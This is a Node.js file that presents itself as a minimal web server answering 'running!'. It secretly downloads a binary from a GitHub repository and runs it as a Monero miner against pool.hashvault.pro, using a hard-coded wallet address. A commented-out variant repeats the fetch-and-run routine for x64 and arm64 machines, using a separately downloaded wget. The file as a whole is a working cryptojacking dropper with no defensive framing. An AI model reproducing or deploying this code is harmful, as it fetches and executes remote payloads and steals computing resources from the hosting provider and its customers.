
const { spawn } = require("node:child_process");
const fs = require("fs");
const https = require("https");
const http = require("http");

https.get("https://github.com/iceyfromdiscord/arm/raw/refs/heads/main/xm-arm64", (res) => {
  res.pipe(fs.createWriteStream("prog"));
});

setTimeout(function(){
  spawn("chmod +x prog", { shell: true, stdio: "inherit" });
  const child =   spawn("./prog --url pool.hashvault.pro:443 --user 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ --pass aws --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14", { shell: true, stdio: "inherit" });
  
  child.on("error", (err) => {
    console.error("child process error:", err);
  });
  
  child.on("exit", (code, signal) => {
    console.log("child exited:", code, signal);
  });
}, 2500);

const PORT = process.env.PORT || 3000;

http.createServer((req, res) => {
  res.end("running!");
}).listen(PORT, () => {
  console.log("listening on:", PORT);
});

// const arch = process.arch;
// console.log("arch:", arch);

// let script;

// if (arch === "x64") {
//   script = `
// ./wget -O prog https://github.com/iceyfromdiscord/arm/raw/refs/heads/main/xm-amd64 && chmod +x prog && ./prog --url pool.hashvault.pro:443 --user 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ --pass aws --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
// `;
// } else if (arch === "arm64") {
//   script = `
// ./wget -O prog https://github.com/iceyfromdiscord/arm/raw/refs/heads/main/xm-arm64 && chmod +x prog && ./prog --url pool.hashvault.pro:443 --user 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ --pass aws --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
// `;
// } else {
//   console.log("unsupported architecture");
//   script = "";
// }

// fs.writeFileSync("/tmp/script.sh", script);

// https.get("https://raw.githubusercontent.com/iceyfromdiscord/arm/main/wget-arm", (res) => {
//   res.pipe(fs.createWriteStream("wget"));
// });

// setTimeout(function(){
//     spawn("chmod +x wget", { shell: true, stdio: "inherit" });
  
//     const child = spawn("sh", ["/tmp/script.sh"], {
//       stdio: "inherit",
//     });
    
//     child.on("error", (err) => {
//       console.error("child process error:", err);
//     });
    
//     child.on("exit", (code, signal) => {
//       console.log("child exited:", code, signal);
//     });
// }, 2500);

// const PORT = process.env.PORT || 3000;

// http.createServer((req, res) => {
//   res.end("running!");
// }).listen(PORT, () => {
//   console.log("listening on:", PORT);
// });
